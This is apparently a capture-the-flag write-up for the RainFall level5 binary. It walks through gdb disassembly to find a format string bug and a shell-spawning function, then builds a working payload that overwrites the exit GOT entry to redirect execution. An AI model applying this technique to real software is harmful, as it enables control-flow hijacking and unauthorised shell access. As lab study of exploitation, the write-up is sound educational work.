Dump of assembler code for function main:
   0x08048504 <+0>:	push   ebp
   0x08048505 <+1>:	mov    ebp,esp
   0x08048507 <+3>:	and    esp,0xfffffff0
   0x0804850a <+6>:	call   0x80484c2 <n>
   0x0804850f <+11>:	leave  
   0x08048510 <+12>:	ret    
End of assembler dump.

Nothing interesting here, just a call to the n() function

Dump of assembler code for function n:
   0x080484c2 <+0>:	push   ebp
   0x080484c3 <+1>:	mov    ebp,esp
   0x080484c5 <+3>:	sub    esp,0x218
   0x080484cb <+9>:	mov    eax,ds:0x8049848
   0x080484d0 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x080484d4 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x080484dc <+26>:	lea    eax,[ebp-0x208]
   0x080484e2 <+32>:	mov    DWORD PTR [esp],eax
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:	lea    eax,[ebp-0x208]
   0x080484f0 <+46>:	mov    DWORD PTR [esp],eax
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
   0x080484f8 <+54>:	mov    DWORD PTR [esp],0x1
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
End of assembler dump.


0x080484cb <+9>:	mov    eax,ds:0x8049848
0x080484d0 <+14>:	mov    DWORD PTR [esp+0x8],eax
0x080484d4 <+18>:	mov    DWORD PTR [esp+0x4],0x200
0x080484dc <+26>:	lea    eax,[ebp-0x208]
0x080484e2 <+32>:	mov    DWORD PTR [esp],eax
0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>

As usual, a call to fgets (char *s, 0x200, STDIN);

0x080484ea <+40>:	lea    eax,[ebp-0x208]
0x080484f0 <+46>:	mov    DWORD PTR [esp],eax
0x080484f3 <+49>:	call   0x8048380 <printf@plt>

printf (buffer);
This is a format string vulnerability, as seen in the previous exercises;

0x080484f8 <+54>:	mov    DWORD PTR [esp],0x1
0x080484ff <+61>:	call   0x80483d0 <exit@plt>

then we exit, we do not return.


Dump of assembler code for function o:
   0x080484a4 <+0>:	push   ebp
   0x080484a5 <+1>:	mov    ebp,esp
   0x080484a7 <+3>:	sub    esp,0x18
   0x080484aa <+6>:	mov    DWORD PTR [esp],0x80485f0
   0x080484b1 <+13>:	call   0x80483b0 <system@plt>
   0x080484b6 <+18>:	mov    DWORD PTR [esp],0x1
   0x080484bd <+25>:	call   0x8048390 <_exit@plt>
End of assembler dump.


(gdb) x/s 0x80485f0
0x80485f0:	 "/bin/sh"

0x080484aa <+6>:	mov    DWORD PTR [esp],0x80485f0
0x080484b1 <+13>:	call   0x80483b0 <system@plt>

This function calls a shell.

The exploit here is that we want to use the format string vulnerability in the n() fonction to interact with the global offset table (GOT) and change the exit adress to the o () function first instruction

Lets find GOT entry of exit

(gdb) disassemble exit
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:	jmp    *0x8049838
   0x080483d6 <+6>:	push   $0x28
   0x080483db <+11>:	jmp    0x8048370
End of assembler dump.

(gdb) x/wx 0x8049838
0x8049838 <exit@got.plt>:	0x080483d6

We found it ! 

we reverse it for little endian : "\x38\x98\x04\x08" 

The first instruction of the o() function is : 0x080484a4

(gdb) p/d 0x080484a4
$3 = 134513828

134513828 - 4 (the adress) = 134513824 , this is the width we will want to add.

Last thing we need to know is where our buffer is printed on the stack:

level5@RainFall:~$ ./level5 
AAAA %x %x %x %x
AAAA 200 b7fd1ac0 b7ff37d0 41414141

AAAA corresponds to the 4th value, so we can now build this command :

python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/exploit

